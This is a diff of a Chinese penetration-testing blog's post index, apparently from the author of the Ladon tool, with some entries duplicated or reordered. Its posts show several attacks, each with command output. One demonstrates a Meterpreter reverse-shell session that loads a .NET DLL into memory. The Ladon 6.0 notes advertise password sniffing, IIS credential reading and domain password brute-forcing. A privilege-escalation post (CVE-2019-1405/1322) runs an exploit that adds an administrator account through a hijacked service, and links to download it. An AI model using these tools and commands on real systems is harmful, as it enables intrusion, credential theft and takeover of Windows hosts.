+    <url>/p/57438.html</url>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>随着XP和2003退出Windows系统，.NET与PowerShell在渗透中将会更吃香，<br>虽然.NET和PowerShell可以相互调用但PowerShell的兼容性远不如.NET，<br>且想要执行PowerShell，前提也需要.net环境，效率方面也是程序比脚本强<br>同样都可内存加载，为何非要鼓吹PowerShell呢，很多PowerShell框架或模块，<br>兼容性和稳定性并不好都没人说，好了不扯太远，下面我们来看一下如何使用<br>MSF中Meterpreter的powershell模块在内存中执行.NET程序集。</p>
+<h3 id="0x001-C-DLL"><a href="#0x001-C-DLL" class="headerlink" title="0x001 C# DLL"></a>0x001 C# DLL</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Text;</span><br><span class="line"></span><br><span class="line">namespace msftest</span><br><span class="line">&#123;</span><br><span class="line">    public class msf</span><br><span class="line">    &#123;</span><br><span class="line">        public static string run()</span><br><span class="line">        &#123;</span><br><span class="line">            return &quot;msftest by k8gege&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x002-PowerShell"><a href="#0x002-PowerShell" class="headerlink" title="0x002 PowerShell"></a>0x002 PowerShell</h3><p>首先我们先通过系统自带PowerShell执行DLL，看DLL功能是否正常。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">PS C:\Users\k8gege\&gt; [<span class="type">Reflection.Assembly</span>]::LoadFile(<span class="string">"C:\Users\k8gege\msftest.dll"</span>)</span><br><span class="line"></span><br><span class="line">GAC    Version        Location</span><br><span class="line">---    -------        --------</span><br><span class="line">False  v2.<span class="number">0.50727</span>     C:\Users\k8gege\\msftest.dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Users\k8gege\&gt; [<span class="type">msftest.msf</span>]::run()</span><br><span class="line">msftest by k8gege</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x003-MSF加载-NET"><a href="#0x003-MSF加载-NET" class="headerlink" title="0x003 MSF加载.NET"></a>0x003 MSF加载.NET</h3><p>将DLL复制至MSF服务器,使用Meterpreter的powershell模块在内存中执行DLL</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:443 </span><br><span class="line">[*] Sending stage (180291 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.1.61:443 -&gt; 192.168.1.5:54647) at 2019-12-19 20:36:14 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; load powershell</span><br><span class="line">Loading extension powershell...Success.</span><br><span class="line">meterpreter &gt; powershell_import msftest.dll</span><br><span class="line">[+] File successfully imported. No result was returned.</span><br><span class="line">meterpreter &gt; powershell_execute <span class="string">"[msftest.msf]::run()"</span></span><br><span class="line">[+] Command execution completed:</span><br><span class="line">msftest by k8gege</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x004-关于兼容性"><a href="#0x004-关于兼容性" class="headerlink" title="0x004 关于兼容性"></a>0x004 关于兼容性</h3><p>1.MSF中的powershell模块稳定性和兼容性并不好，K8在两台WIN7中测试<br>有一台刚加载powershell模块，MET就崩溃导致权限丢失（而且还弹框）<br>再者某些程序集和PowerShell脚本也不能正常加载，有些功能也会失效。<br>这一点Cobalt Strike做得比较好，对.net和PowerShell兼容性80%吧，<br>.NET加载功能好比虚拟机加载操作系统，CS无法执行部分.NET函数很正常<br>正如Ladon在CS下执行，部分功能直接不可用，部分功能执行还有问题。<br>有些人可能说是Ladon的问题，当然说得也没错，但没想过CS的问题吗<br>它提供.NET程序执行的功能,只是使用了几个微软API接口，并不完全<br>试想一下被微软收购做了10几年.NET跨平台的MONO也不能保证100%兼容<br>CS确实是非常强大我承认(不然不使用)，但强大并不等于它就没有问题<br>它的缺点和优点一样，非常多，你用久了懂在理懂的功能多了就会发现<br>MONO那么大都不能保证完全兼容.NET，CS区区几行代码能完全兼容吗?</p>
+<p>我上面说的Ladon在CS下有问题，说Ladon也有问题没错，是因为我认为<br>写一个好的渗透工具，应尽量兼容各种环境。不过CS也只是使用的工具，<br>还不是目标环境，要是连工具自身有BUG的模块都能完全兼容，就是完美。</p>
+<p>目前Ladon有几个模块不兼容CS，在CNA脚本里有注明，用前必看。其它模块<br>可能在CS下使用远不如EXE好用，特别是那些没把时间改成3秒内的，默认60秒<br>才有回显，说成是Ladon扫描慢(即便改成0秒也慢)，因为CS无法完美快速回显。<br>看看CS自带的简单端口扫描或其它扫描，光扫几台机器，CS的回显就很慢吧。<br>何况Ladon还是外置插件，如Ladon扫描百度子域名很快，但在CS下回显很慢，<br>并不是Ladon扫得慢，好比把水管前面接一根吸管，要装满一桶水，能快吗。<br>Ladon扫描很快如同水管，但CS回显如同吸管，水管里的水再快也会因吸管变慢。</p>
+<p>2.powershell模块也支持EXE程序，但需要把.exe改成.dll后缀才能加载。<br>因为通过powershell加载，如果通过系统本身的PowerShell加载都不正常，<br>MSF加载也会失败，因为MSF并不是虚拟一个.NET加载功能。</p>
+<p>如下所示，有时通过系统PowerShell加载ex一样报错<br>PS C:\Users\k8gege&gt; [Reflection.Assembly]::LoadFile(“C:\Users\k8gege\test.exe”)<br>使用“1”个参数调用“LoadFile”时发生异常:“生成此程序集的运行时比当前加载的运<br>行时新,无法加载此程序集。 (异常来自 HRESULT:0x8013101B)”<br>所在位置 行:1 字符: 32</p>
+<ul>
+<li>[Reflection.Assembly]::LoadFile &lt;&lt;&lt;&lt; (“C:\Users\k8gege\test.exe”)<ul>
+<li>CategoryInfo          : NotSpecified: (:) [], MethodInvocationException</li>
+<li>FullyQualifiedErrorId : DotNetMethodException</li>
+</ul>
+</li>
+</ul>
+<h3 id="0x005-结论"><a href="#0x005-结论" class="headerlink" title="0x005 结论"></a>0x005 结论</h3><p>虽然本文介绍了通过MSF加载执行.NET程序的方法，但是从兼容性以及稳定性来看<br>目前在实战中还是慎用为好，以免因为弹框或崩溃导致权限丢失。不能因为MSF强大<br>而无脑使用它的所有功能，程序强大并不代表所有功能模块都稳定好用。只需要使用<br>稳定好用的模块功能即可，其它模块可以等作者更新稳定后再使用。</p>
+<p>注意：我这里说的是不推荐用MSF中的PowerShell加载模块，并不是说MSF。<br>如同说霍金身体残废，但却没有说他是废人哦，何况只是说他一只手受伤。</p>
+]]></content>
+      <categories>
+        <category>Metasploit</category>
+        <category>.NET</category>
+        <category>PowerShell</category>
+      </categories>
+      <tags>
+        <tag>Metasploit</tag>
+        <tag>PowerShell</tag>
+        <tag>.NET</tag>
+        <tag>C#</tag>
+        <tag>MSF</tag>
+        <tag>meterpreter</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Ladon6.0新增密码嗅探、IIS密码读取、LDAP域密码爆破</title>
+    <url>/p/56393.html</url>
+    <content><![CDATA[<p><a href="https://github.com/k8gege" target="_blank" rel="noopener"><img alt="Author" data-original="https://img.shields.io/badge/Author-k8gege-blueviolet"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Ladon" data-original="https://img.shields.io/badge/Ladon-6.0-yellowgreen"></a> <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener"><img alt="Bin" data-original="https://img.shields.io/badge/Ladon-Bin-ff69b4"></a> <a href="https://github.com/k8gege/Ladon/issues" target="_blank" rel="noopener"><img alt="GitHub issues" data-original="https://img.shields.io/github/issues/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Github Stars" data-original="https://img.shields.io/github/stars/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub forks" data-original="https://img.shields.io/github/forks/k8gege/Ladon"></a><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub license" data-original="https://img.shields.io/github/license/k8gege/Ladon"></a></p>
+<h3 id="Ladon6-0"><a href="#Ladon6-0" class="headerlink" title="Ladon6.0"></a>Ladon6.0</h3><p>新增FTP/HTTP密码嗅探、IIS密码读取、LDAP域密码爆破、<br>进程详细信息获取、渗透相关信息获取、命令行参数信息<br>操作系统识别、Wmi密码爆破、Smb密码爆破等功能优化</p>
+<h3 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h3><table>
+<thead>
+<tr>
+<th>动作</th>
+<th>模块</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>新增</td>
+<td>LdapScan</td>
+<td>AD域密码爆破:基于Ldap协议爆破Windows密码</td>
+</tr>
+<tr>
+<td>新增</td>
+<td>FtpSniffer/SnifferFtp</td>
+<td>Ftp密码嗅探(无需WinPcap)</td>
+</tr>
+<tr>
+<td>新增</td>
+<td>HttpSniffer/SnifferHTTP</td>
+<td>HTTP密码嗅探(无需WinPcap)</td>
+</tr>
+<tr>
+<td>新增</td>
+<td>GetCmdLine/CmdLine</td>
+<td>获取进程命令行参数/可指定进程</td>
+</tr>
+<tr>
+<td>新增</td>
+<td>GetInfo</td>
+<td>获取渗透基础信息（IP、域信息、系统信息、软件信息、网络连接、补丁信息、用户等）</td>
+</tr>
+<tr>
+<td>新增</td>
+<td>GetInfo2</td>
+<td>包含GetInfo &amp; Wmi获取信息</td>
+</tr>
+<tr>
+<td>新增</td>
+<td>Sniffer</td>
+<td>网络嗅探(源地址、目标地址)，可用于发现内网存活主机、恶意木马上线地址</td>
+</tr>
+<tr>
+<td>新增</td>
+<td>EnumIIS/IisWeb</td>
+<td>获取IIS站点、路径、帐号、密码</td>
+</tr>
+<tr>
+<td>新增</td>
+<td>EnumProcess/ProcessList/tasklist</td>
+<td>枚举进程 结果(PID、Session、位数、进程名、用户名、路径、标题)</td>
+</tr>
+<tr>
+<td>更新</td>
+<td>HttpDownload/wget</td>
+<td>HTTP下载命令简化也可使用wget</td>
+</tr>
+<tr>
+<td>更新</td>
+<td>OsScan</td>
+<td>扫描速度优化(某项目批量C段不再卡死)</td>
+</tr>
+<tr>
+<td>更新</td>
+<td>WmiScan</td>
+<td>135端口关闭或RPC不可用停止爆破</td>
+</tr>
+<tr>
+<td>更新</td>
+<td>SmbScan</td>
+<td>445端口关闭停止爆破(功能完美代替IpcScan，只是需使用DLL)</td>
+</tr>
+<tr>
+<td>移除</td>
+<td>IPCScan</td>
+<td>速度慢以及批量可能存在误报将其移除，反正SmbScan完全替代</td>
+</tr>
+<tr>
+<td>更新</td>
+<td>所有模块</td>
+<td>所有功能模块参数忽略大小写</td>
+</tr>
+</tbody></table>
+<h3 id="LdapScan-AD域服务器密码爆破"><a href="#LdapScan-AD域服务器密码爆破" class="headerlink" title="LdapScan AD域服务器密码爆破"></a>LdapScan AD域服务器密码爆破</h3><p>非域内机器也可破解跨网段AD域服务器，LDAP端口为389<br>注意非3389，即便跑出来的密码能登远程桌面也没半毛钱关系<br>还有WMI、SMB(IPC)跑出来的密码也一样，3389是RDP协议<br>WMI端口135，SMB端口445，不要以为能登3389一定能IPC连接<br>有时一个帐密各种协议方法都能连到远程机器只能说运气好<br>不要说这个密码3389可以登，但是WMI或SMB跑不出来，瞎搞<br>默认条件下都不能保证100%，更何况经过配置或出问题的系统<br><img alt="LdapScan" data-original="http://k8gege.org/k8img/Ladon/exe/LdapScan_6.0.gif"></p>
+<h3 id="FtpSniffer-FTP密码嗅探"><a href="#FtpSniffer-FTP密码嗅探" class="headerlink" title="FtpSniffer FTP密码嗅探"></a>FtpSniffer FTP密码嗅探</h3><p>支持两种写法: FtpSniffer/SnifferFtp<br>Example: Ladon FtpSniffer 192.168.1.8(本机某个IP相当于指定网卡)<br><img alt="FtpSniffer" data-original="http://k8gege.org/k8img/Ladon/exe/FtpSniffer.PNG"></p>
+<h3 id="HttpSniffer-HTTP密码嗅探"><a href="#HttpSniffer-HTTP密码嗅探" class="headerlink" title="HttpSniffer HTTP密码嗅探"></a>HttpSniffer HTTP密码嗅探</h3><p>支持两种写法: HttpSniffer/SnifferHTTP<br>Example: Ladon HttpSniffer 192.168.1.8(本机某个IP相当于指定网卡)<br><img alt="HttpSniffer" data-original="http://k8gege.org/k8img/Ladon/exe/HttpSniffer.PNG"></p>
+<h3 id="Sniffer-网络嗅探"><a href="#Sniffer-网络嗅探" class="headerlink" title="Sniffer 网络嗅探"></a>Sniffer 网络嗅探</h3><p>基于Socket RAW嗅探，无需安装Winpcap，但需管理员权限<br>主要用于发现内网存活机器或嗅探管理员登陆FTP或WEB站点密码<br>后续可能会添加其它功能可能另外写个专门用于嗅探的工具</p>
+<p>PS: 目前网上大部嗅探工具都是基于Winpcap抓包，某些机器针对其做限制，会提示找不到网卡无法嗅探。<br>重点是不少程序不是GUI就是只能在Linux下用，如果你用py的SCAPY(需winpcap)来实现发现程序高达48M<br>当然也可用于发现恶意木马上线地址(如Cobal strike默认一分钟才发包的netstat不一定看得到)</p>
+<p>Example: Ladon HttpSniffer 192.168.1.8(本机某个IP相当于指定网卡)<br><img alt="Sniffer" data-original="http://k8gege.org/k8img/Ladon/exe/Sniffer.PNG"></p>
+<h3 id="EnumIIS-IIS站点密码读取"><a href="#EnumIIS-IIS站点密码读取" class="headerlink" title="EnumIIS IIS站点密码读取"></a>EnumIIS IIS站点密码读取</h3><p>获取IIS站点、路径、帐号、密码<br><img alt="EnumIIS" data-original="http://k8gege.org/k8img/Ladon/exe/EnumIIS.PNG"></p>
+<h3 id="EnumProcess-进程详细信息获取"><a href="#EnumProcess-进程详细信息获取" class="headerlink" title="EnumProcess 进程详细信息获取"></a>EnumProcess 进程详细信息获取</h3><p>支持三种写法: EnumProcess/ProcessList/tasklist<br>结果(PID、Session、位数、进程名、用户名、路径、标题)<br><img alt="EnumProcess" data-original="http://k8gege.org/k8img/Ladon/exe/EnumProcess.PNG"></p>
+<h3 id="GetCmdLine-进程启动参数"><a href="#GetCmdLine-进程启动参数" class="headerlink" title="GetCmdLine 进程启动参数"></a>GetCmdLine 进程启动参数</h3><p>进程启动参数/可指定进程<br>支持2种写法: GetCmdLine/CmdLine<br><img alt="getcmdline" data-original="http://k8gege.org/k8img/Ladon/exe/getcmdline.PNG"></p>
+<h3 id="GetInfo-获取渗透基础信息"><a href="#GetInfo-获取渗透基础信息" class="headerlink" title="GetInfo 获取渗透基础信息"></a>GetInfo 获取渗透基础信息</h3><p>获取渗透基础信息（IP、域信息、系统信息、软件信息、网络连接、补丁信息、用户等）<br>GetInfo2 包含GetInfo &amp; Wmi获取的相关信息</p>
+<h3 id="全部功能"><a href="#全部功能" class="headerlink" title="全部功能"></a>全部功能</h3><p><a href="http://k8gege.org/p/648af4b3.html">http://k8gege.org/p/648af4b3.html</a></p>
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
+]]></content>
+      <categories>
+        <category>工具</category>
+        <category>Ladon</category>
+        <category>密码</category>
+        <category>嗅探</category>
+      </categories>
+      <tags>
+        <tag>Ladon</tag>
+        <tag>Tool</tag>
+        <tag>Sniffer</tag>
+        <tag>FtpSniffer</tag>
+        <tag>HttpSniffer</tag>
+        <tag>IIS</tag>
+        <tag>LDAP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Ladon7.4 CVE-2020-0688 Exchange序列化漏洞利用</title>
     <url>/p/cve-2020-0688.html</url>
     <content><![CDATA[<p style="color:#fff;"> 
@@ -1849,8 +2171,8 @@ window.location.href="http://k8gege.org/Ladon/WinrmScan.html";
 ]]></content>
       <categories>
         <category>Ladon</category>
-        <category>密码爆破</category>
         <category>远程执行</category>
+        <category>密码爆破</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -2238,9 +2560,9 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 ]]></content>
       <categories>
         <category>Ladon</category>
-        <category>主机发现</category>
         <category>内网渗透</category>
         <category>信息收集</category>
+        <category>主机发现</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -2524,328 +2846,6 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
       <tags>
         <tag>Ladon</tag>
         <tag>Brute</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>利用SqlDataSourceEnumerator获取局域网SQL主机</title>
-    <url>/p/61471.html</url>
-    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>SQL Server 允许应用程序在当前网络中查找 SQL Server 实例。 SqlDataSourceEnumerator 类向应用程序开发人员公开此信息，提供包含所有可见服务器的信息的 DataTable。 此返回的表包含网络上可用的服务器实例的列表，该列表与用户尝试创建新连接时提供的列表匹配，并展开包含连接属性上所有可用服务器的下拉列表。对话框。 显示的结果并非总是完整的。</p>
-<h3 id="SqlDataSourceEnumerator"><a href="#SqlDataSourceEnumerator" class="headerlink" title="SqlDataSourceEnumerator"></a>SqlDataSourceEnumerator</h3><p>命名空间: System.Data.Sql<br>程序集: System.Data.dll</p>
-<p>提供了一种枚举本地网络内的所有可用 SQL Server 实例的机制。</p>
-<p>通过方法调用返回的表包含以下列，所有列均包含 string 值：<br>列     描述<br>ServerName     服务器的名称。<br>InstanceName     服务器实例的名称。 如果服务器作为默认实例运行，则为空白。<br>IsClustered     指示服务器是否属于群集。<br>Version     服务器的版本。 例如:</p>
-<p>-9.00 （SQL Server 2005）<br>-10.0. xx （SQL Server 2008）<br>-10.50 （SQL Server 2008 R2）<br>-11.0. xx （SQL Server 2012）</p>
-<h3 id="C-示例代码"><a href="#C-示例代码" class="headerlink" title="C#示例代码"></a>C#示例代码</h3><p>.NET与PowerShell谁的兼容性和执行效率更好就不用我说了</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using System.Data.Sql;  </span><br><span class="line">  </span><br><span class="line">class Program  </span><br><span class="line">&#123;  </span><br><span class="line">  static void Main()  </span><br><span class="line">  &#123;  </span><br><span class="line">    &#x2F;&#x2F; Retrieve the enumerator instance and then the data.  </span><br><span class="line">    SqlDataSourceEnumerator instance &#x3D;  </span><br><span class="line">      SqlDataSourceEnumerator.Instance;  </span><br><span class="line">    System.Data.DataTable table &#x3D; instance.GetDataSources();  </span><br><span class="line">  </span><br><span class="line">    &#x2F;&#x2F; Display the contents of the table.  </span><br><span class="line">    DisplayData(table);  </span><br><span class="line">  </span><br><span class="line">    Console.WriteLine(&quot;Press any key to continue.&quot;);  </span><br><span class="line">    Console.ReadKey();  </span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">  private static void DisplayData(System.Data.DataTable table)  </span><br><span class="line">  &#123;  </span><br><span class="line">    foreach (System.Data.DataRow row in table.Rows)  </span><br><span class="line">    &#123;  </span><br><span class="line">      foreach (System.Data.DataColumn col in table.Columns)  </span><br><span class="line">      &#123;  </span><br><span class="line">        Console.WriteLine(&quot;&#123;0&#125; &#x3D; &#123;1&#125;&quot;, col.ColumnName, row[col]);  </span><br><span class="line">      &#125;  </span><br><span class="line">      Console.WriteLine(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="PowerShell命令"><a href="#PowerShell命令" class="headerlink" title="PowerShell命令"></a>PowerShell命令</h3><p>系统未安装或禁用PowerShell会失效，但也比国人故意吹捧的PowerUPSQL好很多倍。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\k8gege\Desktop&gt;PowerShell -Command <span class="string">"[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()"</span></span><br><span class="line"></span><br><span class="line">ServerName          InstanceName        IsClustered         Version</span><br><span class="line">----------          ------------        -----------         -------</span><br><span class="line">K82003-77562E10</span><br><span class="line">WIN-OLDM1T2H9M4</span><br></pre></td></tr></table></figure>
-
-<h3 id="PowerUPSQL"><a href="#PowerUPSQL" class="headerlink" title="PowerUPSQL"></a>PowerUPSQL</h3><p>此工具也是基于SqlDataSourceEnumerator实现的，兼容性较差，很多系统下运行各种报错。</p>
-<pre><code class="Bash">PS C:\Users\k8gege\Desktop\PowerUpSQL-master&gt; Get-SQLInstanceBroadcast -Verbose
-详细信息: Attempting to identify SQL Server instances on the broadcast domain.
-详细信息: 2 SQL Server instances were found.
-
-ComputerName                        Instance                           IsClustered                        Version                           
-------------                        --------                           -----------                        -------                           
-K82003-77562E10                     K82003-77562E10                                                                                         
-WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
-<h3 id="Ladon-EnumMssql"><a href="#Ladon-EnumMssql" class="headerlink" title="Ladon EnumMssql"></a>Ladon EnumMssql</h3><p>Ladon的EnumMssql模块不支持扫描，若内网存在多个网段，可使用PortScan扫描探测。<br><img alt="img" data-original="https://camo.githubusercontent.com/2e97e127bfc1acd625ee289dbfaf4b3ffd307bd7/68747470733a2f2f6b38676567652e6769746875622e696f2f6b38696d672f4c61646f6e2f63732f43535f456e756d4d5353514c2e676966"></p>
-<p>Ladon与PowerUPSQL对比，Ladon支持任意Win系统，而PowerUPSQL就未必能用了<br><img alt="img" data-original="https://camo.githubusercontent.com/73b58a071a70adf62dc7f4aecd1dff48d8e5df40/68747470733a2f2f6b38676567652e6769746875622e696f2f6b38696d672f4c61646f6e2f6578652f456e756d4d5353514c2e676966"></p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/framework/data/adonet/sql/enumerating-instances-of-sql-server" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/framework/data/adonet/sql/enumerating-instances-of-sql-server</a></p>
-]]></content>
-      <categories>
-        <category>Ladon</category>
-        <category>主机发现</category>
-        <category>信息收集</category>
-      </categories>
-      <tags>
-        <tag>Ladon</tag>
-        <tag>.NET</tag>
-        <tag>SQL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows提权工具 CVE-2019-1405 &amp; CVE-2019-1322</title>
-    <url>/p/19321.html</url>
-    <content><![CDATA[<h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>由NCC Group研究人员所发现的两个通过COM本地服务进行非法提权的漏洞。第一个漏洞CVE-2019-1405是COM服务中的一个逻辑错误，可让本地普通用户以LOCAL SERVICE身份执行任意命令。第二个漏洞CVE-2019-1322是一个简单的服务配置错误，可让本地SERVICE组中的任何用户重新配置以SYSTEM权限运行的服务（此漏洞也被其他研究人员发现）。当以上两个漏洞结合在一起时，就允许本地普通用户以SYSTEM权限执行任意命令。</p>
-<p>全面检查了一些Windows服务,发现以LOCAL SERVICE或NETWORK SERVICE运行的所有用户都可以执行这种攻击。其中就包括前面我们提到的UPnP Device Host服务,这样我们就能以本地任意用户身份,结合使用CVE-2019-1405及CVE-2019-1322这两个漏洞,成功在Windows 10(1803到1903)系统上将权限提升至SYSTEM用户。</p>
-<h3 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>Vendor     Product     Versions<br>Microsoft    Windows 10    -, 1607, 1709, 1803, 1809, 1903<br>Microsoft    Windows 7    -<br>Microsoft    Windows 8.1    -<br>Microsoft    Windows Rt 8.1    -<br>Microsoft    Windows Server 2008    -, R2<br>Microsoft    Windows Server 2012    -, R2<br>Microsoft    Windows Server 2016    -, 1803, 1903<br>Microsoft    Windows Server 2019    -</p>
-<h3 id="默认提权"><a href="#默认提权" class="headerlink" title="默认提权"></a>默认提权</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\null\Desktop&gt;COMahawk64.exe</span><br><span class="line">[\] Progress:  1/9 2/9 3/9 4/9 5/9 6/9 7/9 8/9 9/9</span><br><span class="line">[+] Hopefully k8gege:K8gege520 is added as an admin.</span><br><span class="line"></span><br><span class="line">C:\Users\null\Desktop&gt;net user</span><br><span class="line"></span><br><span class="line">\\DESKTOP-3F42O5D 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            DefaultAccount           Guest</span><br><span class="line">k8gege                   null                     WDAGUtilityAccount</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
-
-<h3 id="指定命令"><a href="#指定命令" class="headerlink" title="指定命令"></a>指定命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\null\Desktop&gt;COMahawk64.exe <span class="string">"net user k8gege K8gege123? /add"</span></span><br><span class="line">[+] Executing <span class="built_in">command</span> [ sc config UsoSvc binpath= <span class="string">"cmd.exe /c net user k8gege K8gege123? /add"</span> ]</span><br><span class="line">[\] Progress:  1/6 2/6 3/6 4/6 5/6 6/6</span><br><span class="line">[+] Command executed.</span><br><span class="line">C:\Users\null\Desktop&gt;net user</span><br><span class="line"></span><br><span class="line">\\DESKTOP-3F42O5D 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            DefaultAccount           Guest</span><br><span class="line">k8gege                   null                     WDAGUtilityAccount</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
-
-<h3 id="Win10提权"><a href="#Win10提权" class="headerlink" title="Win10提权"></a>Win10提权</h3><p>Teston Win10 X64 1803<br><img data-original="http://k8gege.org/k8img/LPE/COMahawk.PNG"></p>
-<h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><p><a href="https://github.com/apt69/COMahawk" target="_blank" rel="noopener">https://github.com/apt69/COMahawk</a></p>
-<p><a href="https://github.com/k8gege/K8tools/raw/master/Comahawk.rar" target="_blank" rel="noopener">https://github.com/k8gege/K8tools/raw/master/Comahawk.rar</a></p>
-]]></content>
-      <categories>
-        <category>Exp</category>
-        <category>提权</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>LPE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Ladon6.0新增密码嗅探、IIS密码读取、LDAP域密码爆破</title>
-    <url>/p/56393.html</url>
-    <content><![CDATA[<p><a href="https://github.com/k8gege" target="_blank" rel="noopener"><img alt="Author" data-original="https://img.shields.io/badge/Author-k8gege-blueviolet"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Ladon" data-original="https://img.shields.io/badge/Ladon-6.0-yellowgreen"></a> <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener"><img alt="Bin" data-original="https://img.shields.io/badge/Ladon-Bin-ff69b4"></a> <a href="https://github.com/k8gege/Ladon/issues" target="_blank" rel="noopener"><img alt="GitHub issues" data-original="https://img.shields.io/github/issues/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Github Stars" data-original="https://img.shields.io/github/stars/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub forks" data-original="https://img.shields.io/github/forks/k8gege/Ladon"></a><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub license" data-original="https://img.shields.io/github/license/k8gege/Ladon"></a></p>
-<h3 id="Ladon6-0"><a href="#Ladon6-0" class="headerlink" title="Ladon6.0"></a>Ladon6.0</h3><p>新增FTP/HTTP密码嗅探、IIS密码读取、LDAP域密码爆破、<br>进程详细信息获取、渗透相关信息获取、命令行参数信息<br>操作系统识别、Wmi密码爆破、Smb密码爆破等功能优化</p>
-<h3 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h3><table>
-<thead>
-<tr>
-<th>动作</th>
-<th>模块</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>新增</td>
-<td>LdapScan</td>
-<td>AD域密码爆破:基于Ldap协议爆破Windows密码</td>
-</tr>
-<tr>
-<td>新增</td>
-<td>FtpSniffer/SnifferFtp</td>
-<td>Ftp密码嗅探(无需WinPcap)</td>
-</tr>
-<tr>
-<td>新增</td>
-<td>HttpSniffer/SnifferHTTP</td>
-<td>HTTP密码嗅探(无需WinPcap)</td>
-</tr>
-<tr>
-<td>新增</td>
-<td>GetCmdLine/CmdLine</td>
-<td>获取进程命令行参数/可指定进程</td>
-</tr>
-<tr>
-<td>新增</td>
-<td>GetInfo</td>
-<td>获取渗透基础信息（IP、域信息、系统信息、软件信息、网络连接、补丁信息、用户等）</td>
-</tr>
-<tr>
-<td>新增</td>
-<td>GetInfo2</td>
-<td>包含GetInfo &amp; Wmi获取信息</td>
-</tr>
-<tr>
-<td>新增</td>
-<td>Sniffer</td>
-<td>网络嗅探(源地址、目标地址)，可用于发现内网存活主机、恶意木马上线地址</td>
-</tr>
-<tr>
-<td>新增</td>
-<td>EnumIIS/IisWeb</td>
-<td>获取IIS站点、路径、帐号、密码</td>
-</tr>
-<tr>
-<td>新增</td>
-<td>EnumProcess/ProcessList/tasklist</td>
-<td>枚举进程 结果(PID、Session、位数、进程名、用户名、路径、标题)</td>
-</tr>
-<tr>
-<td>更新</td>
-<td>HttpDownload/wget</td>
-<td>HTTP下载命令简化也可使用wget</td>
-</tr>
-<tr>
